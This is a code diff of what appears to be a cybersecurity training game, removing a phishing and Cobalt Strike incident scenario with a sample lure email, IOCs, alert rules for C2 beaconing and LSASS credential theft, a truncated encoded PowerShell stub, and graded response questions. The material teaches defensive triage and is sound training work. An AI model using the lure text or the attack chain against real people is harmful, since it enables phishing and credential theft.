@@ -2750,933 +2750,1396 @@ const GLOSSARY = {};
 function GT({t,children}) { return <span>{children}</span>; }
 
 
-/* ═══════════════════════════════════════════════════════════════════════
-   ANALYST GAME ENGINE
-   Replaces: ScoreModal, CoachPopup, ActionOverlay, DecisionQuestion,
-             GuestSignupModal, SOCConsole
-═══════════════════════════════════════════════════════════════════════ */
+function ScoreModal({inc, steps, elapsed, hintCount, onBack}) {
+  const mm = String(Math.floor(elapsed/60)).padStart(2,"0");
+  const ss2 = String(elapsed%60).padStart(2,"0");
+  const xpEarned = steps.reduce((a,s)=>a+s.xp,0) - (hintCount*5);
+  const grade = elapsed < 600 ? "S" : elapsed < 900 ? "A" : elapsed < 1200 ? "B" : "C";
+  const gradeColor = {"S":"#fbbf24","A":"#22c55e","B":"#3b82f6","C":"#9ca3af"}[grade];
+  const isTP = inc.type === "TP";
 
-/* ── SCENARIO DATA ─────────────────────────────────────────────────── */
-const GAME_SCENARIOS = {
-  "phishing-c2": {
-    incId: "INC-2026-0441",
-    title: "Phishing Attack",
-    subtitle: "Finance workstation compromised — C2 beacon active",
-    type: "TRUE_POSITIVE",
-    scenes: [
-      {
-        id: "inbox", phase: "TRIAGE", xp: 20,
-        title: "Suspicious email arrived",
-        brief: "A finance analyst received this email 3 minutes ago. She has not opened it yet. Analyze it before she does.",
-        icon: "📧",
-        type: "email",
-        data: {
-          from: "accounts@hdfc-bank-secure.net",
-          fromDisplay: "HDFC Bank Accounts",
-          to: "priya.sharma@corp.in",
-          subject: "⚠ Urgent: Invoice payment required — Action needed",
-          time: "08:14 IST",
-          body: `Dear Priya,\n\nPlease find the attached invoice for processing. This payment is overdue and requires your immediate approval before EOD.\n\nKindly open the attached file and complete the verification steps.\n\nRegards,\nHDFC Bank Corporate Payments`,
-          attachment: { name: "Invoice_Final.docm", type: "macro-doc", size: "124 KB" },
-          headers: {
-            "Received-From": "mail.hdfc-bank-secure.net ← NOT hdfc.com",
-            "X-Originating-IP": "185.220.101.47 ← known threat actor IP",
-            "DMARC": "FAIL ← domain spoofed",
-            "SPF": "FAIL ← not authorized sender",
-            "Reply-To": "payments@hdfc-bank-secure.net ← different from sender"
-          },
-          iocs: ["hdfc-bank-secure.net ≠ hdfc.com", "DMARC FAIL", "SPF FAIL", "Macro-enabled .docm attachment"]
-        },
-        decision: {
-          question: "You inspected the email. What do you do?",
-          options: [
-            { text: "Report as phishing — suspicious domain, macro attachment, auth failures", correct: true, why: "Correct. hdfc-bank-secure.net is not hdfc.com. SPF and DMARC both fail. The .docm macro attachment is a classic phishing delivery. Report and block." },
-            { text: "Let it sit — wait to see if she opens it", correct: false, why: "Wrong. Phishing emails need immediate action. Every minute it sits in the inbox is a risk." },
-            { text: "Forward to IT — not your problem", correct: false, why: "SOC responsibility is to act immediately on phishing. Forwarding delays the response." }
-          ]
-        }
-      },
-      {
-        id: "siem", phase: "TRIAGE", xp: 20,
-        title: "SIEM fired — 4 critical alerts",
-        brief: "She opened the attachment before you could block it. BlueTrace SIEM immediately fired. Read the alerts. Click the most critical one.",
-        icon: "🚨",
-        type: "siem",
-        data: {
-          alerts: [
-            { id: "BT-9901", time: "08:17:04", sev: "CRITICAL", rule: "OUTBOUND_C2_BEACON", msg: "svchost32.exe → 203.0.113.47:443 every 30s", host: "WS-CORP-FIN-044", user: "priya.sharma@corp.in", key: true,
-              detail: { "Risk Score": "97/100", "Host": "WS-CORP-FIN-044", "User": "priya.sharma@corp.in", "Process": "svchost32.exe", "Dest IP": "203.0.113.47:443", "Interval": "30 seconds", "Encrypted": "Yes — TLS 1.3" }},
-            { id: "BT-9902", time: "08:17:04", sev: "CRITICAL", rule: "LSASS_MEMORY_ACCESS", msg: "GrantedAccess=0x1fffff on lsass.exe — credential theft", host: "WS-CORP-FIN-044",
-              detail: { "Risk Score": "95/100", "Target": "lsass.exe PID 688", "Access": "0x1fffff (FULL READ)", "Indicator": "Credential dumping tool (Mimikatz/similar)" }},
-            { id: "BT-9903", time: "08:17:09", sev: "HIGH", rule: "SUSPICIOUS_PROCESS_CHAIN", msg: "WINWORD.EXE → cmd.exe → powershell.exe", host: "WS-CORP-FIN-044",
-              detail: { "Chain": "WINWORD → cmd.exe → powershell.exe", "Trigger": "Macro in Invoice_Final.docm", "Verdict": "Macro execution chain" }},
-            { id: "BT-9904", time: "08:18:12", sev: "HIGH", rule: "DNS_QUERY_SPIKE", msg: "847 DNS queries/hr to cdn-update.net", host: "WS-CORP-FIN-044",
-              detail: { "Domain": "cdn-update.net", "Rate": "847/hr", "Entropy": "4.8 — abnormally high" }}
-          ]
-        },
-        decision: {
-          question: "You read the C2 alert. Risk score 97/100. Two correlated rules on the same host. What is your classification?",
-          options: [
-            { text: "TRUE POSITIVE — Open incident and investigate immediately", correct: true, why: "Correct. 97/100 with two correlated rules (C2 beacon + LSASS access) on the same host = confirmed True Positive. Open it now." },
-            { text: "FALSE POSITIVE — Probably a scanner, close it", correct: false, why: "Wrong. Two correlated rules at 97/100 is not a scanner. C2 beacon + credential theft together = active attacker." },
-            { text: "Escalate to senior — not sure", correct: false, why: "Wrong. You have enough information. 97/100 + two correlated rules = standard True Positive classification." }
-          ]
-        }
-      },
-      {
-        id: "edr", phase: "INVESTIGATION", xp: 25,
-        title: "Trace the kill chain",
-        brief: "Open EDR. Look at the process tree on WS-CORP-FIN-044. Click each suspicious process. Find the malware and hash it to confirm.",
-        icon: "🖥",
-        type: "edr",
-        data: {
-          host: "WS-CORP-FIN-044",
-          processes: [
-            { name: "explorer.exe", pid: 1204, depth: 0, status: "normal", info: null },
-            { name: "OUTLOOK.EXE", pid: 2241, depth: 1, status: "normal", info: { "Path": "C:\\Program Files\\Microsoft Office\\", "Verdict": "Normal — email client" }},
-            { name: "WINWORD.EXE", pid: 3847, depth: 2, status: "suspicious", info: { "Parent": "OUTLOOK.EXE", "File opened": "Invoice_Final.docm", "Flag": "Office app spawned from email attachment" }},
-            { name: "cmd.exe", pid: 4102, depth: 3, status: "suspicious", info: { "Parent": "WINWORD.EXE", "Flag": "⚠ Office apps should NOT spawn cmd.exe", "Verdict": "Macro executing shell command" }},
-            { name: "powershell.exe", pid: 4210, depth: 4, status: "malicious", info: { "Parent": "cmd.exe", "Command": "-enc JABjAG0AZAAg... (encoded)", "Flag": "Downloading payload from internet" }},
-            { name: "svchost32.exe", pid: 4891, depth: 5, status: "malicious", info: { "Parent": "powershell.exe", "Path": "C:\\Users\\priya\\Downloads\\", "Hash": "a3f2b9d1e4c8f0a7", "Flag": "FAKE — real svchost is in C:\\Windows\\System32\\", "Size": "48 KB", "Verdict": "⚠ C2 IMPLANT — Cobalt Strike beacon" }}
-          ],
-          hashTarget: { hash: "a3f2b9d1e4c8f0a7", score: 97, family: "CobaltStrike.Beacon.4", detections: "58/70 AV engines", c2: "203.0.113.47:443" }
-        },
-        decision: {
-          question: "EDR confirms: OUTLOOK→WINWORD→cmd→powershell→svchost32.exe. Hash lookup: 97/100 malicious, Cobalt Strike. What does this mean?",
-          options: [
-            { text: "Phishing email with macro dropped a Cobalt Strike C2 implant", correct: true, why: "Correct. OUTLOOK→WINWORD = email attachment. cmd/powershell = macro execution. svchost32.exe = Cobalt Strike beacon dropped by the macro." },
-            { text: "Vulnerability in Microsoft Office was remotely exploited", correct: false, why: "The chain starts from OUTLOOK which means an email attachment triggered WINWORD. This is macro execution, not a remote exploit." },
-            { text: "User deliberately installed the software", correct: false, why: "The process chain is automated — macro execution from an email attachment. This is not user-initiated installation." }
-          ]
-        }
-      },
-      {
-        id: "network", phase: "CONTAINMENT", xp: 25,
-        title: "Active C2 — cut the connection",
-        brief: "svchost32.exe is beaconing to the attacker every 30 seconds. The connection is live right now. You need to act.",
-        icon: "📡",
-        type: "network",
-        data: {
-          connection: {
-            src: "WS-CORP-FIN-044 (10.10.1.44)",
-            dst: "203.0.113.47:443",
-            process: "svchost32.exe (PID 4891)",
-            protocol: "HTTPS · TLS 1.3",
-            frequency: "Every 30 seconds",
-            threatScore: "100/100 — Cobalt Strike C2 · Tor exit node",
-            status: "ACTIVE"
-          }
-        },
-        decision: {
-          question: "The machine is still beaconing. Every 30 seconds the attacker gets updates. What do you do?",
-          options: [
-            { text: "Network isolate the machine — cut all external connections, preserve for forensics", correct: true, why: "Best action. Network isolation severs C2 immediately while keeping the machine accessible for forensics. Full shutdown would destroy RAM evidence." },
-            { text: "Block the IP at the firewall only", correct: false, why: "Insufficient. Attacker can pivot to a backup C2 server. The machine is still infected. Isolate the endpoint entirely." },
-            { text: "Keep monitoring — collect more evidence first", correct: false, why: "Wrong. Every 30 seconds credentials are being sent to the attacker. On a confirmed C2 beacon you isolate immediately." }
-          ]
-        }
-      },
-      {
-        id: "quarantine", phase: "CONTAINMENT", xp: 20,
-        title: "Quarantine the malware",
-        brief: "The machine is isolated. Now find and quarantine the two malicious files — the implant and the original delivery document.",
-        icon: "🗂",
-        type: "quarantine",
-        data: {
-          path: "C:\\Users\\priya\\Downloads\\",
-          files: [
-            { name: "Invoice_Final.docm", icon: "📄", size: "124 KB", malicious: true, info: { "Hash": "f9e2a1b3d4c5e6f7", "Verdict": "Malicious macro document — initial infection vector", "Action": "Quarantine and submit for analysis" }},
-            { name: "report_Q3.xlsx", icon: "📊", size: "87 KB", malicious: false, info: null },
-            { name: "svchost32.exe", icon: "⚙️", size: "48 KB", malicious: true, info: { "Hash": "a3f2b9d1e4c8f0a7", "Verdict": "Cobalt Strike beacon — C2 implant", "Action": "Quarantine immediately" }},
-            { name: "profile_photo.png", icon: "🖼", size: "2.1 MB", malicious: false, info: null }
-          ]
-        },
-        decision: {
-          question: "Both files quarantined. What should happen next to prevent this from recurring?",
-          options: [
-            { text: "Enable EDR prevention mode + block macro execution in Office + email gateway rule for .docm files", correct: true, why: "Correct. Three defensive improvements: EDR should have blocked powershell.exe, macros should be blocked at policy level, and .docm attachments blocked at email gateway." },
-            { text: "Change the user's password and that's enough", correct: false, why: "Credentials were dumped — password change is necessary but not sufficient. The technical controls that failed need to be fixed." },
-            { text: "Delete the user's email account", correct: false, why: "Extreme and unnecessary. The issue is a policy gap, not the user's account." }
-          ]
-        }
-      },
-      {
-        id: "report", phase: "CLOSE", xp: 20,
-        title: "Write the incident report",
-        brief: "Incident contained. Now document it. The best IR reports state root cause clearly — not just what happened, but why the controls failed.",
-        icon: "📋",
-        type: "report",
-        data: {
-          summary: {
-            "Incident ID": "INC-2026-0441",
-            "Classification": "TRUE POSITIVE",
-            "Severity": "P1 CRITICAL",
-            "Host": "WS-CORP-FIN-044",
-            "User": "priya.sharma@corp.in",
-            "Attack type": "Phishing + Cobalt Strike C2",
-            "Malware": "CobaltStrike.Beacon.4",
-            "C2": "203.0.113.47 (score 100/100)",
-            "Status": "CONTAINED"
-          }
-        },
-        decision: {
-          question: "What is the ROOT CAUSE of this incident — why did the attack succeed technically?",
-          options: [
-            { text: "EDR was in detect-only mode — prevention policy was not enforced", correct: true, why: "Correct. If EDR was in PREVENT mode, powershell.exe dropping svchost32.exe would have been blocked automatically. This operational gap is the root cause." },
-            { text: "The user clicked a phishing email — human error", correct: false, why: "That is the attack vector, not the root cause. Root cause is why the technical controls failed AFTER the user made a mistake." },
-            { text: "The antivirus did not detect the malware", correct: false, why: "Too vague. The specific gap: EDR prevention policy was off. That is the precise operational failure to fix." }
-          ]
-        }
-      }
-    ]
-  }
-};
+  return (
+    <div style={{position:"fixed",inset:0,background:"rgba(0,0,0,0.85)",zIndex:999,
+      display:"flex",alignItems:"center",justifyContent:"center",padding:"20px"}}>
+      <div style={{background:"#0d1117",border:"1px solid rgba(255,255,255,0.08)",
+        borderRadius:20,maxWidth:480,width:"100%",overflow:"hidden",
+        boxShadow:"0 20px 60px rgba(0,0,0,0.6)"}}>
 
-/* ── GAME STYLES ───────────────────────────────────────────────────── */
-const GAME_CSS = `
-<style id="game-styles">
-.g-root{position:fixed;inset:0;background:#020408;color:#fff;font-family:'Courier New',Courier,monospace;display:flex;flex-direction:column;overflow:hidden;z-index:200}
-.g-scan{position:fixed;inset:0;pointer-events:none;z-index:9999;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,0.1) 2px,rgba(0,0,0,0.1) 4px)}
-.g-hud{display:flex;align-items:center;justify-content:space-between;padding:8px 16px;border-bottom:1px solid rgba(0,255,120,0.1);background:rgba(2,4,8,0.98);flex-shrink:0;gap:8px}
-.g-hud-l{display:flex;align-items:center;gap:10px}
-.g-brand{font-size:13px;font-weight:700;letter-spacing:0.15em;color:#00ff88;text-shadow:0 0 20px rgba(0,255,136,0.3)}
-.g-inc{font-size:9px;letter-spacing:0.1em;color:rgba(0,255,136,0.3);display:none}
-@media(min-width:420px){.g-inc{display:block}}
-.g-hud-r{display:flex;align-items:center;gap:12px}
-.g-stat{text-align:center}
-.g-stat-n{font-size:16px;font-weight:700;color:#00ff88;line-height:1;text-shadow:0 0 10px rgba(0,255,136,0.3)}
-.g-stat-l{font-size:8px;color:rgba(255,255,255,0.25);letter-spacing:0.1em;text-transform:uppercase;margin-top:1px}
-.g-atk{flex-shrink:0;padding:5px 16px 7px;border-bottom:1px solid rgba(255,34,68,0.15);background:rgba(2,4,8,0.98)}
-.g-atk-top{display:flex;justify-content:space-between;font-size:9px;letter-spacing:0.1em;margin-bottom:3px;color:#ff2244}
-.g-atk-track{height:3px;background:rgba(255,34,68,0.1);border-radius:2px}
-.g-atk-fill{height:100%;border-radius:2px;background:linear-gradient(90deg,#ff2244,#ff4466);transition:width 1s linear;box-shadow:0 0 6px rgba(255,34,68,0.3)}
-.g-scene{flex:1;display:flex;flex-direction:column;overflow:hidden;min-height:0}
-.g-sh{padding:8px 16px;border-bottom:1px solid rgba(255,255,255,0.06);display:flex;align-items:center;gap:8px;flex-shrink:0;background:rgba(4,6,12,0.98)}
-.g-phase{font-size:8px;font-weight:700;letter-spacing:0.18em;padding:2px 8px;border-radius:3px;flex-shrink:0}
-.ph-triage{background:rgba(255,34,68,0.12);color:#ff2244}
-.ph-investigation{background:rgba(0,170,255,0.12);color:#00aaff}
-.ph-containment{background:rgba(255,170,0,0.1);color:#ffaa00}
-.ph-close{background:rgba(0,255,136,0.08);color:#00ff88}
-.g-stitle{font-size:13px;font-weight:700;color:#fff;flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;margin:0 8px}
-.g-snum{font-size:10px;color:rgba(255,255,255,0.2);flex-shrink:0}
-.g-brief{padding:8px 16px;background:rgba(0,255,136,0.03);border-bottom:1px solid rgba(0,255,136,0.08);font-size:11px;line-height:1.55;color:rgba(255,255,255,0.45);flex-shrink:0;display:flex;gap:8px}
-.g-brief strong{color:#fff;font-weight:600}
-.g-body{flex:1;overflow-y:auto;overflow-x:hidden;-webkit-overflow-scrolling:touch}
-.g-body::-webkit-scrollbar{width:2px}
-.g-body::-webkit-scrollbar-thumb{background:rgba(0,255,136,0.15)}
-.g-foot{padding:10px 14px 16px;border-top:1px solid rgba(255,255,255,0.06);flex-shrink:0;background:rgba(4,6,12,0.98)}
-.g-flash{position:fixed;inset:0;pointer-events:none;z-index:8000;opacity:0;transition:opacity 0.08s}
-.g-flash.r{background:rgba(255,34,68,0.15)}
-.g-flash.g{background:rgba(0,255,136,0.1)}
-.g-flash.on{opacity:1}
-/* Email */
-.em-card{margin:12px;border:1px solid rgba(255,255,255,0.08);border-radius:8px;overflow:hidden;cursor:pointer;transition:border-color .2s}
-.em-card:hover,.em-card.open{border-color:rgba(0,255,136,0.25)}
-.em-prev{padding:12px 14px;background:rgba(6,10,18,0.9);display:flex;gap:10px}
-.em-av{width:32px;height:32px;border-radius:50%;background:rgba(255,34,68,0.12);border:1px solid rgba(255,34,68,0.25);display:flex;align-items:center;justify-content:center;font-size:14px;flex-shrink:0}
-.em-meta{flex:1;min-width:0}
-.em-from{font-size:11px;font-weight:700;color:#fff;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;margin-bottom:2px}
-.em-sus{color:#ff2244}
-.em-subj{font-size:11px;color:rgba(255,255,255,0.45);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;margin-bottom:1px}
-.em-time{font-size:9px;color:rgba(255,255,255,0.2)}
-.em-body{padding:12px 14px;background:rgba(3,5,10,0.95);border-top:1px solid rgba(255,255,255,0.06);display:none}
-.em-card.open .em-body{display:block}
-.em-field{display:flex;gap:6px;margin-bottom:5px;font-size:10px}
-.ef-k{color:rgba(255,255,255,0.25);flex-shrink:0;width:56px}
-.ef-v{color:rgba(255,255,255,0.7)}
-.ef-v.sus{color:#ff2244}
-.em-text{margin:10px 0;padding:10px;background:rgba(255,255,255,0.02);border-left:2px solid rgba(255,255,255,0.08);border-radius:0 4px 4px 0;font-size:11px;color:rgba(255,255,255,0.5);line-height:1.7;white-space:pre-wrap}
-.em-attach{display:inline-flex;align-items:center;gap:7px;padding:7px 12px;border:1px solid rgba(255,170,0,0.25);border-radius:5px;font-size:11px;color:#ffaa00;margin:4px 0;background:rgba(255,170,0,0.04)}
-.em-ioc{display:inline-block;padding:1px 6px;border-radius:3px;font-size:9px;font-weight:700;letter-spacing:.06em;margin-left:5px;text-transform:uppercase}
-.ioc-warn{background:rgba(255,170,0,0.12);color:#ffaa00}
-.ioc-danger{background:rgba(255,34,68,0.12);color:#ff2244}
-.em-hdr{margin-top:8px}
-.em-hdr-toggle{font-size:10px;color:rgba(255,255,255,0.2);cursor:pointer;letter-spacing:.05em}
-.em-hdr-toggle:hover{color:rgba(255,255,255,0.5)}
-.em-hdr-list{display:none;margin-top:6px;padding:8px;background:rgba(0,0,0,0.4);border-radius:4px;font-size:10px;line-height:1.8}
-.em-hdr-list.open{display:block}
-.hdr-bad{color:#ff2244}
-/* SIEM */
-.siem-wrap{padding:10px;background:#000;min-height:100%}
-.siem-hdr{font-size:9px;letter-spacing:.12em;text-transform:uppercase;color:rgba(0,255,136,0.4);margin-bottom:10px;padding-bottom:7px;border-bottom:1px solid rgba(255,255,255,0.06)}
-.al-card{border-left:3px solid transparent;border:1px solid rgba(255,255,255,0.07);border-radius:5px;margin-bottom:6px;cursor:pointer;transition:all .15s;overflow:hidden}
-.al-card:hover{border-color:rgba(0,255,136,0.2);background:rgba(0,255,136,0.03)}
-.al-card.sel{border-color:rgba(0,255,136,0.4);background:rgba(0,255,136,0.05)}
-.al-card.crit{border-left:3px solid #ff2244}
-.al-card.high{border-left:3px solid #ffaa00}
-.al-top{display:flex;gap:7px;align-items:center;padding:8px 10px}
-.al-sev{font-size:8px;font-weight:700;padding:2px 6px;border-radius:2px;letter-spacing:.07em;flex-shrink:0}
-.sev-CRITICAL{background:rgba(255,34,68,0.15);color:#ff2244}
-.sev-HIGH{background:rgba(255,170,0,0.12);color:#ffaa00}
-.al-rule{font-size:11px;color:#fff;font-weight:700;flex:1}
-.al-time{font-size:9px;color:rgba(255,255,255,0.2);flex-shrink:0}
-.al-pulse{width:6px;height:6px;border-radius:50%;background:#ff2244;animation:ap .7s steps(1) infinite;flex-shrink:0}
-@keyframes ap{0%,100%{opacity:1}50%{opacity:0}}
-.al-msg{font-size:10px;color:rgba(255,255,255,0.4);padding:0 10px 8px}
-.al-det{padding:8px 10px;border-top:1px solid rgba(255,255,255,0.06);background:rgba(0,0,0,0.3);display:none;animation:gin .2s ease}
-@keyframes gin{from{opacity:0;transform:translateY(-4px)}to{opacity:1;transform:none}}
-.al-det.open{display:block}
-.al-row{display:flex;gap:6px;font-size:10px;margin-bottom:3px}
-.ar-k{color:rgba(255,255,255,0.25);flex-shrink:0;width:68px}
-.ar-v{color:#fff}
-.ar-v.bad{color:#ff2244}
-/* EDR */
-.edr-wrap{padding:10px;background:#000;min-height:100%}
-.edr-hdr{font-size:9px;letter-spacing:.12em;text-transform:uppercase;color:#00aaff;margin-bottom:10px;padding-bottom:7px;border-bottom:1px solid rgba(0,170,255,0.15);display:flex;gap:8px;align-items:center}
-.edr-host{background:rgba(0,170,255,0.1);color:#00aaff;padding:2px 7px;border-radius:3px;font-size:9px}
-.proc{display:flex;align-items:center;gap:7px;padding:7px 8px;border-radius:4px;border:1px solid transparent;margin-bottom:3px;cursor:pointer;transition:all .15s;font-size:11px}
-.proc:hover{border-color:rgba(255,255,255,0.1);background:rgba(255,255,255,0.02)}
-.proc.sel{border-color:rgba(0,170,255,0.3);background:rgba(0,170,255,0.05)}
-.proc.suspicious{border-color:rgba(255,170,0,0.15);background:rgba(255,170,0,0.03)}
-.proc.suspicious .p-name{color:#ffaa00}
-.proc.malicious{border-color:rgba(255,34,68,0.2);background:rgba(255,34,68,0.04)}
-.proc.malicious .p-name{color:#ff2244}
-.p-indent{flex-shrink:0;color:rgba(255,255,255,0.1)}
-.p-name{flex:1;font-weight:600}
-.p-pid{font-size:9px;color:rgba(255,255,255,0.2)}
-.p-tag{font-size:8px;padding:1px 5px;border-radius:2px;font-weight:700;letter-spacing:.06em;flex-shrink:0}
-.pt-sus{background:rgba(255,170,0,0.12);color:#ffaa00}
-.pt-mal{background:rgba(255,34,68,0.12);color:#ff2244}
-.p-det{margin-bottom:6px;padding:8px;background:rgba(0,0,0,0.5);border:1px solid rgba(255,255,255,0.07);border-radius:4px;font-size:10px;display:none;animation:gin .2s ease}
-.p-det.open{display:block}
-.pd-row{display:flex;gap:6px;margin-bottom:2px}
-.pd-k{color:rgba(255,255,255,0.25);flex-shrink:0;width:72px}
-.pd-v{color:#fff}
-.pd-v.bad{color:#ff2244}
-.hash-wrap{margin-top:10px;padding:10px;border:1px solid rgba(255,255,255,0.07);border-radius:6px;background:rgba(0,0,0,0.5)}
-.hw-lbl{font-size:9px;letter-spacing:.12em;text-transform:uppercase;color:rgba(255,255,255,0.2);margin-bottom:7px}
-.hw-row{display:flex;gap:7px;margin-bottom:7px}
-.hw-inp{flex:1;background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.1);border-radius:3px;padding:7px 9px;color:#00ff88;font-family:'Courier New',monospace;font-size:11px;outline:none;transition:border-color .2s}
-.hw-inp:focus{border-color:#00ff88}
-.hw-btn{padding:7px 13px;background:rgba(0,255,136,0.08);border:1px solid rgba(0,255,136,0.2);color:#00ff88;font-family:'Courier New',monospace;font-size:11px;cursor:pointer;border-radius:3px;transition:all .2s;touch-action:manipulation}
-.hw-btn:hover{background:rgba(0,255,136,0.15)}
-.hash-res{padding:9px;border-radius:4px;font-size:11px;line-height:1.7;animation:gin .3s ease}
-.hash-res.mal{background:rgba(255,34,68,0.08);border:1px solid rgba(255,34,68,0.2)}
-.hash-res.safe{background:rgba(0,255,136,0.05);border:1px solid rgba(0,255,136,0.15)}
-.hr-score{font-size:20px;font-weight:700;margin-bottom:3px}
-.hr-score.bad{color:#ff2244;text-shadow:0 0 15px rgba(255,34,68,0.3)}
-.hr-score.ok{color:#00ff88}
-/* Network */
-.net-wrap{padding:10px;background:#000;min-height:100%}
-.net-hdr{font-size:9px;letter-spacing:.12em;text-transform:uppercase;color:#ffaa00;margin-bottom:10px;padding-bottom:7px;border-bottom:1px solid rgba(255,170,0,0.15)}
-.conn-card{border:1px solid rgba(255,34,68,0.25);border-radius:7px;overflow:hidden;margin-bottom:10px;background:rgba(255,34,68,0.03)}
-.cc-top{padding:9px 13px;background:rgba(255,34,68,0.07);border-bottom:1px solid rgba(255,34,68,0.12);display:flex;align-items:center;gap:8px}
-.cc-dot{width:6px;height:6px;border-radius:50%;background:#ff2244;animation:ap .5s steps(1) infinite}
-.cc-dot.off{background:#00ff88;animation:none;box-shadow:0 0 6px #00ff88}
-.cc-title{font-size:12px;color:#fff;font-weight:700;flex:1}
-.cc-body{padding:10px 13px}
-.cc-row{display:flex;gap:7px;margin-bottom:5px;font-size:10px;align-items:flex-start}
-.cc-k{color:rgba(255,255,255,0.25);flex-shrink:0;width:72px}
-.cc-v{color:#fff}
-.cc-v.bad{color:#ff2244}
-.cc-v.ok{color:#00ff88}
-.cc-visual{display:flex;align-items:center;gap:10px;margin:10px 0;padding:10px;background:rgba(0,0,0,0.5);border-radius:5px;font-size:11px}
-.cv-node{flex:1;padding:8px;border-radius:4px;border:1px solid;text-align:center}
-.cv-node.inf{border-color:rgba(255,34,68,0.3);background:rgba(255,34,68,0.06)}
-.cv-node.ext{border-color:rgba(255,170,0,0.25);background:rgba(255,170,0,0.05)}
-.cv-lbl{font-size:8px;color:rgba(255,255,255,0.25);margin-top:3px}
-.cv-arr{color:#ff2244;font-size:15px;animation:arr 1s ease-in-out infinite;flex-shrink:0}
-.cv-arr.off{color:#00ff88;animation:none}
-@keyframes arr{0%,100%{opacity:.3;transform:translateX(-3px)}50%{opacity:1;transform:translateX(3px)}}
-/* Quarantine */
-.quar-wrap{padding:10px;background:#000;min-height:100%}
-.q-path{font-size:10px;color:rgba(255,255,255,0.2);margin-bottom:10px;padding:6px 9px;background:rgba(255,255,255,0.02);border-radius:3px;border:1px solid rgba(255,255,255,0.06)}
-.q-path span{color:#00ff88}
-.f-row{display:flex;align-items:center;gap:9px;padding:8px 9px;border-radius:4px;border:1px solid transparent;margin-bottom:3px;cursor:pointer;transition:all .15s;font-size:11px}
-.f-row:hover{border-color:rgba(255,255,255,0.1);background:rgba(255,255,255,0.02)}
-.f-row.sel{border-color:rgba(255,34,68,0.3);background:rgba(255,34,68,0.05)}
-.f-row.done{border-color:rgba(0,255,136,0.2);background:rgba(0,255,136,0.04);opacity:.6;cursor:default}
-.f-row.done .f-name{text-decoration:line-through;color:rgba(0,255,136,0.6)}
-.f-icon{font-size:15px;flex-shrink:0}
-.f-name{flex:1;color:#fff}
-.f-size{font-size:9px;color:rgba(255,255,255,0.2)}
-.f-tag{font-size:8px;padding:1px 5px;border-radius:2px;font-weight:700;letter-spacing:.06em;flex-shrink:0}
-.ft-mal{background:rgba(255,34,68,0.12);color:#ff2244}
-.f-actions{padding:10px;border:1px solid rgba(255,255,255,0.07);border-radius:6px;background:rgba(0,0,0,0.5);margin-top:8px;display:none;animation:gin .2s ease}
-.f-actions.open{display:block}
-.fa-title{font-size:9px;letter-spacing:.12em;text-transform:uppercase;color:rgba(255,255,255,0.2);margin-bottom:8px}
-.fa-row{display:flex;gap:6px;font-size:10px;margin-bottom:3px}
-.far-k{color:rgba(255,255,255,0.25);flex-shrink:0;width:64px}
-.far-v{color:#fff}
-.far-v.bad{color:#ff2244}
-/* Report */
-.rep-wrap{padding:10px}
-.rep-sec{padding:10px;border:1px solid rgba(255,255,255,0.07);border-radius:6px;background:rgba(4,8,16,0.9);margin-bottom:10px}
-.rep-sec-title{font-size:9px;letter-spacing:.14em;text-transform:uppercase;color:rgba(255,255,255,0.2);margin-bottom:8px;padding-bottom:6px;border-bottom:1px solid rgba(255,255,255,0.06)}
-.rep-row{display:flex;gap:6px;font-size:10px;margin-bottom:5px}
-.rk{color:rgba(255,255,255,0.25);flex-shrink:0;width:72px}
-.rv{color:#fff}
-.rv.bad{color:#ff2244}
-.rv.warn{color:#ffaa00}
-.rv.ok{color:#00ff88}
-/* Decision */
-.dec-wrap{padding:10px;background:rgba(0,12,24,0.95);border-top:1px solid rgba(0,170,255,0.15);animation:gin .3s ease}
-.dec-q{font-size:12px;color:#fff;line-height:1.5;margin-bottom:10px;font-weight:600}
-.dec-opts{display:flex;flex-direction:column;gap:6px}
-.dec-opt{display:flex;gap:9px;align-items:flex-start;padding:9px 10px;border:1px solid rgba(255,255,255,0.08);border-radius:5px;cursor:pointer;transition:all .15s;font-size:11px;line-height:1.5;touch-action:manipulation}
-.dec-opt:hover{border-color:rgba(0,170,255,0.3);background:rgba(0,170,255,0.05)}
-.dec-opt.cor{border-color:rgba(0,255,136,0.4);background:rgba(0,255,136,0.07);color:#00ff88;cursor:default}
-.dec-opt.wr{border-color:rgba(255,34,68,0.3);background:rgba(255,34,68,0.06);color:rgba(255,100,100,0.9);cursor:default}
-.dec-key{width:18px;height:18px;border-radius:3px;border:1px solid currentColor;display:flex;align-items:center;justify-content:center;font-size:9px;font-weight:700;flex-shrink:0;margin-top:1px}
-.dec-why{font-size:10px;color:rgba(255,255,255,0.45);margin-top:5px;padding-top:5px;border-top:1px solid rgba(255,255,255,0.08);line-height:1.55;display:none}
-.dec-why.open{display:block}
-.dec-opt.cor .dec-why,.dec-opt.wr .dec-why{color:inherit;opacity:.75}
-/* Buttons */
-.g-next{width:100%;padding:12px;background:rgba(0,255,136,0.08);border:1px solid rgba(0,255,136,0.25);color:#00ff88;font-family:'Courier New',monospace;font-size:12px;letter-spacing:.12em;text-transform:uppercase;cursor:pointer;border-radius:6px;transition:all .2s;touch-action:manipulation;font-weight:700;margin-top:8px}
-.g-next:hover,.g-next:active{background:rgba(0,255,136,0.15)}
-.g-act-row{display:flex;gap:7px;margin-top:8px;flex-wrap:wrap}
-.g-btn{flex:1;min-width:90px;padding:11px 10px;border-radius:5px;font-family:'Courier New',monospace;font-size:11px;letter-spacing:.08em;cursor:pointer;transition:all .2s;border:1px solid;touch-action:manipulation;font-weight:700;text-align:center}
-.g-btn.good{background:rgba(0,255,136,0.07);border-color:rgba(0,255,136,0.25);color:#00ff88}
-.g-btn.good:hover{background:rgba(0,255,136,0.14)}
-.g-btn.bad{background:rgba(255,34,68,0.07);border-color:rgba(255,34,68,0.25);color:#ff2244}
-.g-btn.bad:hover{background:rgba(255,34,68,0.14)}
-.g-btn.neutral{background:rgba(255,255,255,0.03);border-color:rgba(255,255,255,0.1);color:rgba(255,255,255,0.5)}
-.g-btn.neutral:hover{color:#fff;border-color:rgba(255,255,255,0.25)}
-.g-btn:disabled{opacity:.35;cursor:default}
-/* Feedback */
-.g-fb{padding:10px;border-radius:5px;font-size:11px;line-height:1.6;margin-top:8px;animation:gin .3s ease}
-.g-fb.cor{background:rgba(0,255,136,0.06);border:1px solid rgba(0,255,136,0.2);color:#00ff88}
